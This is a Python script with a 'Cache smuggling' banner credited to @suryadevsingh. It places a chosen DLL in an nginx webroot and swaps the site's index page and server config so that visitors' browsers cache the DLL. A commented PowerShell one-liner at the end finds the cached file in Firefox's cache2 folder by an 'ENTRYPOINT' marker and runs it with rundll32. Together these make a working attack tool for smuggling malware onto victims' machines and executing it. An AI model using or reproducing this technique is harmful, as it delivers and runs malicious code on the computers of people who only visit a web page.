import os
import re
import subprocess
import shutil
import signal
import sys
import argparse

def start_nginx_service_safely():
    # Check if the script is being run as a superuser (root)
    if os.geteuid() != 0:
        print("You need to run this script with superuser privileges (e.g., using 'sudo').")
        return

    # Check if the 'service' command exists
    if not shutil.which('service'):
        print("The 'service' command is not available on your system. Make sure you have it installed.")
        return

    try:
        # Command to start the Nginx service
        command = "service nginx start"

        # Run the command using subprocess
        subprocess.run(command, shell=True, check=True)
        print("[+] Nginx service started successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error starting Nginx service: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")


def modify_Serverfile(file_path,replacement_dll):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
            # Define a regular expression pattern to match content starting with / and ending with .dll
            pattern = r'/[^/]+\.dll'
            replacement_dll="/"+replacement_dll
            # Replace the matched content with the replacement keyword
            new_content = re.sub(pattern, replacement_dll, content)
        with open(file_path, 'w') as file:
            file.write(new_content)
    except FileNotFoundError:
        print(f"File not found: {file_path}")
    except Exception as e:
        print(f"An error occurred: {str(e)}")



def deployment(dll_path):
    # updating webroot directory
    dll_file_name=os.path.basename(dll_path)
    clean_up(dll_file_name)
    shutil.copy(dll_path,"/var/www/html")
    modify_Serverfile("./WebServer/index.html",dll_file_name)
    os.rename("/var/www/html/index.html","/var/www/html/index.html.bak")
    shutil.copy("./WebServer/index.html","/var/www/html/index.html")
    #changing the nginx config
    modify_Serverfile("./WebServer/nginx.conf",dll_file_name)
    os.rename("/etc/nginx/sites-available/default","/etc/nginx/sites-available/default.bak")
    shutil.copy("./WebServer/nginx.conf","/etc/nginx/sites-available/default")
    start_nginx_service_safely()


def clean_up(dll_file_name):
    try:
        os.remove(f"/var/www/html/{dll_file_name}")
        if os.path.exists("/etc/nginx/sites-available/default.bak"):
            #clean up of nginx config files
            print("[+] Clean up in process...",end="")
            os.remove("/etc/nginx/sites-available/default")
            os.rename("/etc/nginx/sites-available/default.bak","/etc/nginx/sites-available/default")
        if os.path.exists("/var/www/html/index.html.bak"):
            print("...")
            #clean up of webroot directory
            os.remove("/var/www/html/index.html")
            os.rename("/var/www/html/index.html.bak","/var/www/html/index.html")
        else:
            pass
    except:
        pass

def process_arguments():
    parser = argparse.ArgumentParser(description='My Python Program')

    # Define command-line arguments
    parser.add_argument('--dll', '-d', required=True, help='Dll Input file path')

    # Parse the arguments
    args = parser.parse_args()

    # Access the parsed arguments
    input_file = args.dll

    return input_file

if __name__ == '__main__':
    banner='''
╔═╗┌─┐┌─┐┬ ┬┌─┐  ┌─┐┌┬┐┬ ┬┌─┐┌─┐┬  ┬┌┐┌┌─┐
║  ├─┤│  ├─┤├┤   └─┐││││ ││ ┬│ ┬│  │││││ ┬
╚═╝┴ ┴└─┘┴ ┴└─┘  └─┘┴ ┴└─┘└─┘└─┘┴─┘┴┘└┘└─┘
                                @suryadevsingh
'''
    print(banner)
    input_file = process_arguments()
    if input_file:
        deployment(input_file)
# Firefox

#foreach ($files in @("$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*.default-release\cache2\entries\")) {Get-ChildItem $files -Recurse | ForEach-Object {if (Select-String -Pattern "ENTRYPOINT" -Path $_.FullName) {$dllPath = $_.FullName + '.'; rundll32.exe $dllPath,MainDll}}}
